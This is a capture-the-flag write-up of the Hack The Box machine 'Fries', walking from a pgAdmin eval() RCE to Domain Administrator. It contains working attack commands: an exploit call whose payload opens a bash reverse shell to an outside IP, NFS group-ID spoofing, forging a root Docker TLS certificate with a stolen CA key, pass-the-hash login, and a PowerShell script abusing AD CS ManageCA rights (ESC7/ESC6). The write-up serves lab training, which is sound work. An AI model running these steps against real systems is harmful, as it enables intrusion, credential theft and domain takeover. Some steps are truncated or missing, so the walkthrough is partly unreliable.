## Summary Exploitation
Fries is a Hard difficulty Windows machine on Hack The Box that involves web enumeration, source code review, container escape, NFS exploitation, credential harvesting, and Active Directory Certificate Services abuse.

Starting with Nmap reconnaissance, I discovered a Gitea instance at `code.fries.htb` and a pgAdmin 4 instance at `db-mgmt05.fries.htb`. By reviewing the commit history in Gitea using the provided credentials, I found leaked PostgreSQL credentials. Using these credentials to access pgAdmin 4 version 9.1, I exploited CVE-2025-2945, an authenticated Remote Code Execution vulnerability that passes user input directly into python `eval()`, to obtain a reverse shell inside the pgAdmin Docker container. Inside the container, I found the pgAdmin default password in the environment variables and reused it to SSH into the host as the svc user.

From the host, I discovered an exposed NFS share and an unauthenticated Docker daemon API on port 2376. By mounting the NFS share and spoofing the GID to match the `fries_infra` group, I accessed the `certs` directory which contained Docker TLS certificates. Using the stolen CA private key, I forged a new client certificate with CN=root to gain full access to the Docker daemon. I then spawned a privileged container with the host filesystem mounted to read the user flag and explore the host.

Inside the host filesystem, I found the PWM configuration file containing a bcrypt password hash. After cracking it with Hashcat, I logged into the PWM configuration panel and modified the LDAP connection URL to point to my attack machine. By listening on port 389, I captured plaintext LDAP credentials for svc_infra. Using BloodHound, I identified that `svc_infra` had `ReadGMSAPassword` rights over `gMSA_CA_prod$`. I dumped the gMSA password hash using gMSADumper and authenticated as `gMSA_CA_prod$` via Pass-the-Hash.

With gMSA_CA_prod$ holding ManageCA rights over the domain Certificate Authority, I exploited ESC7 by enabling the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag on the CA, which triggered ESC6 across all certificate templates. Using `svc_infra` to enroll in the User template, I requested a certificate with `administrator@fries.htb` as the UPN. Due to SID mismatch, direct Kerberos authentication failed. I bypassed this by authenticating via LDAP which only validates the UPN, allowing me to reset the Administrator password and obtain a shell as Domain Administrator via Evil-WinRM.

## Initial Access
### Technical Breakdown
CVE-2025-2945 is an authenticated RCE vulnerability in pgAdmin 4. The vulnerability arises when an authenticated attacker sends a malicious payload to either of two endpoints: `/sqleditor/query_tooldownload` or `/cloud/deploy`. Both endpoints pass user-supplied input directly into python's `eval()` without any sanitization, resulting in RCE on the server running pgAdmin.

### Attack Strategy
We will pass the pgAdmin credentials along with the database credentials to initialize a SQL editor session, then trigger RCE by sending a malicious python payload in the `query_commited` parameter to the `/sqleditorquery_tool/download/{trans_id}` endpoint.

### Proof Of Concept
```bash
python3 exp.py --target http://db-mgmt05.fries.htb --username 'd.cooper@fries.htb' --password 'D4LE11maan!!' --db-user root --db-pass 'PsqLR00tpaSS11' --db-name ps_db --payload "__import__('os').system('bash -c \"bash -i >& /dev/tcp/10.10.16.119/4444 0>&1\"')"
```

### NFS UID & GID Spoofing
NFS only checks the numeric GID of the connecting user to verify access, which means 
we can spoof a group by creating one locally with a matching GID. The `fries_infra` 
group name does not exist on the target, so we need to retrieve the raw GID number 
using `ls -lan`:

```bash
svc@web:~$ ls -lan /srv/web.fries.htb/
total 20
drw-r-xr-x 5  655        0 4096 May 28  2025 .
drwxr-xr-x 3    0        0 4096 May 27  2025 ..
drwxrwx--- 2    0 59605603 4096 May 26  2025 certs
drwxrwxrwx 2    0        0 4096 May 31  2025 shared
drwxr----- 5 1000     1000 4096 Jun  7  2025 webroot
```

The `certs` directory is owned by GID `59605603`. We create a matching group on our 
attack machine and add ourselves to it:

```bash
sudo groupadd -g 59605603 fries_infra
sudo usermod -aG fries_infra $(whoami)
newgrp fries_infra
```

### Docker Daemon With TLS
Using the certificates we found in the `certs` directory, we can authenticate directly to the Docker daemon running on port `2376`.

```bash

  --tlscacert=ca.pem \
  --tlscert=server-cert.pem \
  --tlskey=server-key.pem \
  -H tcp://127.0.0.1:2376 ps
Error response from daemon: authorization denied by plugin authz-broker: no policy applied (user: 'fries' action: 'container_list')
```

The TLS authentication succeeded, but we got an authorization error. The `authz-broker` plugin identified us as `CN=fries`, which has no policy defined and therefore no permissions. We found that the authorization policy is stored at `/var/lib/authz-broker/policy.json`:

```bash
svc@web:~$ cat /var/lib/authz-broker/policy.json
{"name":"policy_1", "users": ["svc"], "actions": ["container_list", "container_logs"]}
{"name":"policy_1", "users": ["sysadm"], "actions": ["container"], "readonly":true}
{"name":"policy_2", "users": ["root"], "actions": [""]}
```

There are three users defined in the policy. We choose `root` because its `actions` field is empty, meaning no restrictions to all docker operations.

Since we have the CA private key, we can forge a new client certificate with `CN=root`. In the same mounted NFS directory on our attack machine:

```bash
openssl genrsa -out client-key.pem 4096

openssl req -new -key client-key.pem \
  -out client.csr \
  -subj "/CN=root"

openssl x509 -req -in client.csr \
  -CA ca.pem \
  -CAkey ca-key.pem \
  -CAcreateserial \
  -out client-cert.pem \
  -days 365
```

We can now verify that the forged certificate grants us full access:

### Exploiting ESC7
Based on [Certipy Privilege Escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) and [Vulnerable Certificate Authority Access Control - ESC7](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html), since `gMSA_CA_prod$` holds the ManageCA right, we can modify the CA's configuration to enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag. This forces all certificate templates managed by `fries-DC01-CA` to accept a Subject Alternative Name (SAN) in certificate requests which will enables ESC6.

So first, we need to authenticate into the winrm.
```bash
evil-winrm -i dc01.fries.htb -u svc_infra -H b0f2883453608fb7bffd1ac2e0e18188
```

 Then we will flip it to ESC6 and restart the `certsvc`.
 ```bash
$CertAdmin = New-Object -ComObject CertificateAuthority.Admin
$Config = "DC01\fries-DC01-CA"
$NodePath = "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy"
$EntryName = "EditFlags"

# Read the current value first
$CurrentValue = $CertAdmin.GetConfigEntry($Config, $NodePath, $EntryName)
Write-Host "Current EditFlags value: 0x$($CurrentValue.ToString('X'))"

# Add EDITF_ATTRIBUTESUBJECTALTNAME2 (0x00040000) to existing flags
$NewValue = $CurrentValue -bor 0x00040000
Write-Host "New EditFlags value: 0x$($NewValue.ToString('X'))"

try {
    $CertAdmin.SetConfigEntry($Config, $NodePath, $EntryName, $NewValue)
    Write-Host "SUCCESS: EditFlags updated to include EDITF_ATTRIBUTESUBJECTALTNAME2."
    Restart-Service certsvc
    Write-Host "SUCCESS: certsvc restarted."
} catch {
    Write-Host "Failed with short name. Trying FQDN..."
    try {
        $Config = "DC01.fries.htb\fries-DC01-CA"
        $CertAdmin.SetConfigEntry($Config, $NodePath, $EntryName, $NewValue)
        Write-Host "SUCCESS: EditFlags updated via FQDN."
        Restart-Service certsvc
        Write-Host "SUCCESS: certsvc restarted."
    } catch {
        Write-Host "Error: $($_.Exception.Message)"
    }
}
```
